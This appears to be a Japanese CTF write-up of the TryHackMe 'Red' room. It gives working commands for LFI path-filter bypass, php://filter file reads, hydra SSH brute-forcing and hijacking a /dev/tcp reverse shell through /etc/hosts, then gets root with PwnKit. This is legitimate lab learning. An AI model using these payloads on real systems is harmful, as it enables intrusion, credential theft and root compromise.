# Red CTF

https://tryhackme.com/room/redisl33t

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.238.203
root@ip-10-10-160-188:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-04-05 01:24 BST
Nmap scan report for 10.10.238.203
Host is up (0.0031s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:F5:B6:73:49:8F (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 4.10 seconds
root@ip-10-10-160-188:~# sudo nmap -sV -p22,80 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-04-05 01:24 BST
Nmap scan report for 10.10.238.203
Host is up (0.00016s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
MAC Address: 02:F5:B6:73:49:8F (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.81 seconds
```

SSH, HTTP

### gobuster

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

gobuster dir -x=txt,php -u http://$TARGET -w ./dirlist.txt -t 30 -k

/.php                 (Status: 403) [Size: 278]
/assets               (Status: 301) [Size: 315] [--> http://10.10.238.203/assets/]
/.htaccess            (Status: 403) [Size: 278]
/.htaccess.php        (Status: 403) [Size: 278]
/.htaccess.txt        (Status: 403) [Size: 278]
/.htpasswd.txt        (Status: 403) [Size: 278]
/.htpasswd.php        (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/index.php            (Status: 302) [Size: 0] [--> /index.php?page=home.html]
/readme.txt           (Status: 200) [Size: 675]
/server-status        (Status: 403) [Size: 278]
Progress: 681570 / 681573 (100.00%)
===============================================================
```

readme.txt が出ただけ。AtlantaテンプレートのReadme。

## ファイルインクルージョン

http://10.10.238.203/index.php?page=home.html

というURLが表示されており、ファイルインクルージョンを疑う。

http://10.10.238.203/index.php?page=readme.txt

とするとテキストの内容が表示される。

http://10.10.238.203/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
blue:x:1000:1000:blue:/home/blue:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
red:x:1001:1001::/home/red:/bin/bash
```

http://10.10.238.203/index.php?page=php://filter/convert.base64-encode/resource=index.php

```php
<?php 

function sanitize_input($param) {
    $param1 = str_replace("../","",$param);
    $param2 = str_replace("./","",$param1);
    return $param2;
}

$page = $_GET['page'];
if (isset($page) && preg_match("/^[a-z]/", $page)) {
    $page = sanitize_input($page);
    readfile($page);
} else {
    header('Location: /index.php?page=home.html');
}

?>
```

- `../` と `./` は削除される
- 先頭は小文字アルファベットである必要がある

つまり、...../// は ../ に変換される。

http://10.10.238.203/index.php?page=assets/.....///.....///.....///.....///etc/passwd

の形でアクセスできたが、

http://10.10.238.203/index.php?page=assets/.....///.....///.....///.....///var/log/apache2/access.log

はブランクが返されたのでログポイズニングはできなかった。

http://10.10.238.203/index.php?page=http://10.2.22.182:8000/pentest.php

とするとリモートのPHPをGETしているが、`<?php` と `>` の間が削除されてPHPとして実行できなくなっている。

.bash_hisotory を開けた。

http://10.10.238.203/index.php?page=php://filter/convert.base64-encode/resource=/home/blue/.bash_history

```
echo "Red rules"
cd
hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt
cat passlist.txt
rm passlist.txt
sudo apt-get remove hashcat -y
```

http://10.10.238.203/index.php?page=php://filter/convert.base64-encode/resource=/home/blue/.reminder

```
sup3r_p@s$w0rd!
```

blueのもともとのパスワードをルールファイルを作って変更したということか？

攻撃マシンで同じものを作る。

```shell
$ echo 'sup3r_p@s$w0rd!' > reminder

$ hashcat --stdout reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt 

$ wc -l ./passlist.txt                                          
77 ./passlist.txt
```

```shell
$ hydra -l blue -P ./passlist.txt 10.10.238.203 ssh -t 30
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-04 21:55:57
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 30 tasks per 1 server, overall 30 tasks, 77 login tries (l:1/p:77), ~3 tries per task
[DATA] attacking ssh://10.10.238.203:22/
[22][ssh] host: 10.10.238.203   login: blue   password: ひみつ
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 7 final worker threads did not complete until end.
[ERROR] 7 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-04-04 21:56:11
```

blueのパスワード判明。

```shell
blue@red:~$ ls -al
total 40
drwxr-xr-x 4 root blue 4096 Aug 14  2022 .
drwxr-xr-x 4 root root 4096 Aug 14  2022 ..
-rw-r--r-- 1 blue blue  166 Apr  5 00:22 .bash_history
-rw-r--r-- 1 blue blue  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 blue blue 3771 Feb 25  2020 .bashrc
drwx------ 2 blue blue 4096 Aug 13  2022 .cache
-rw-r----- 1 root blue   34 Aug 14  2022 flag1
-rw-r--r-- 1 blue blue  807 Feb 25  2020 .profile
-rw-r--r-- 1 blue blue   16 Aug 14  2022 .reminder
drwx------ 2 root blue 4096 Aug 13  2022 .ssh
blue@red:~$ cat flag1
THM{Is.................}
```

フラグ１ゲット。

## 強制切断の回避

一定時間たったら強制切断され、パスワードも変えられる。  
まずはこれを回避したい。

```shell
blue@red:~$ Say Bye Bye to your Shell Blue and that password                                                        
Connection to 10.10.238.203 closed by remote host.                                                                  
Connection to 10.10.238.203 closed.
```

redによりリバースシェルが実行されている。

```shell
$ ps -aux

red         1343  0.0  0.0   6972  2564 ?        S    09:18   0:00 bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 &
```

hostsは書き込み権限が付いているように見えるが、実際に編集すると保存時にエラーになる。

```shell
blue@red:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 red
192.168.0.1 redrules.thm

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouter

blue@red:~$ ls -al /etc/hosts
-rw-r--rw- 1 root adm 242 Apr  5 02:06 /etc/hosts
```

lsattr で追記だけ可能と判明。

```shell
blue@red:~$ lsattr /etc/hosts
-----a--------e----- /etc/hosts
```

追記し、リバースシェルの宛先を自分のマシンにする。

```shell
blue@red:~$ echo '10.2.22.182 redrules.thm' >> /etc/hosts
```

切断された後、再度SSH接続するとリバースシェル取得できた。  
おそらく blue のログインがトリガーになっている。

```shell
$ nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.67.201] 57510
bash: cannot set terminal process group (1386): Inappropriate ioctl for device
bash: no job control in this shell
red@red:~$ 
```

```shell
red@red:~$ cat flag2
cat flag2
THM{............................}
```

フラグ２ゲット。  
切断の回避はできなかったが、redのシェルをとれたのでOK。

## 権限昇格

```shell
$ find / -perm -u=s -type f -ls 2>/dev/null
   418507     32 -rwsr-xr-x   1 root     root        31032 Aug 14  2022 /home/red/.git/pkexec
```

/home/red/.git/pkexec に SUIDが付いている。

単純に実行すると、下記エラー。

```shell
red@red:~/.git$ pkexec
pkexec must be setuid root
```

ghidraで見ると、euid（実行ユーザーID）が0でなければこのエラーになる。

```c
  local_2210._0_4_ = geteuid();
  if ((uint)local_2210 == 0) {
```

version は 0.105

```c
g_print("pkexec version %s\n","0.105")
```

Web検索すると、このバージョンのpkexecにはローカル権限昇格の脆弱性がある。

https://github.com/ly4k/PwnKit

Cソースコードの下記部分だけ修正。

```c
    execve("/home/red/.git/pkexec", args, env);
```

コンパイル

```shell
$ gcc -shared PwnKit.c -o PwnKit -Wl,-e,entry -fPIC
```

アップロードして実行。

```shell
red@red:~/.git$ chmod +x ./PwnKit 
red@red:~/.git$ ./PwnKit
root@red:/home/red/.git# id
uid=0(root) gid=0(root) groups=0(root),1001(red)
```

rootシェルゲット。

```shell
root@red:/home/red/.git# ls /root
defense  flag3  snap
root@red:/home/red/.git# cat /root/flag3
THM{..............}
```

フラグ３ゲット

## 振り返り

- 難しかったが、red の存在のおかげで、かなりエキサイティングなチャレンジだった。
- 追記のみ許可されている場合に、lsattr で確認できることは勉強になった。
- システムコマンドがユーザーディレクトリに存在する場合、脆弱性のあるバージョンである可能性がある。
